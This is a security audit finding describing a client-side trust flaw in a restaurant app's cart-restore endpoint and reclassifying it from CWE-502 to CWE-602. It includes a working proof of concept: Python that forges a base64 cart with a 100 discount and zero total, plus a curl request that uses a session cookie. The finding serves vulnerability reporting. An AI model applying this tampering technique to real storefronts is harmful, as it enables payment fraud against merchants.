# M2 — Client-Side Cart Trust (V14, reclassified from CWE-502)

**Severity:** Medium  
**CWE:** CWE-602 (Client-Side Enforcement of Server-Side Security)  
**OWASP:** A08:2021  
**Status:** Confirmed (reclassified)  
**Source draft:** `piolium/findings-draft/p7-014-v14-cart-deserialize.md`

## Summary

`POST /api/cart/restore` base64-decodes the client payload, JSON-unmarshals into `map[string]interface{}`, and **echoes** the values (`discount`, `promo`, `total`) back without server-side recalculation. The original CWE-502 classification is inaccurate for Go's type-safe JSON unmarshalling; the real issue is trusting client-side state.

## PoC

**Payload construction:**
```python
import base64, json
cart = {"items":[{"id":1,"name":"Pizza","qty":1,"price":14.99}],
        "discount":100, "promo":"STAFFONLY", "total":0}
b64 = base64.b64encode(json.dumps(cart).encode()).decode()
```

**Request:**
```bash
curl -X POST http://localhost:4443/api/cart/restore \
  -H "Content-Type: application/json" \
  -H "Cookie: restaurant_session=<alice_session>" \
  -d "{\"cart_data\":\"$b64\"}"
```

Response: `{"cart":{"discount":100,"promo":"STAFFONLY","total":0,...}, "message":"cart restored"}`

## Reclassification Rationale

CWE-502 (Deserialization of Untrusted Data) applies to languages where deserialization can instantiate arbitrary objects (Java ObjectInputStream, PHP `unserialize`, Python pickle). Go's `json.Unmarshal` into `map[string]interface{}` is type-safe and cannot trigger code execution. The actual vulnerability is server-side trust of client-supplied state values. CWE-602 (or CWE-345) is the more accurate classification.
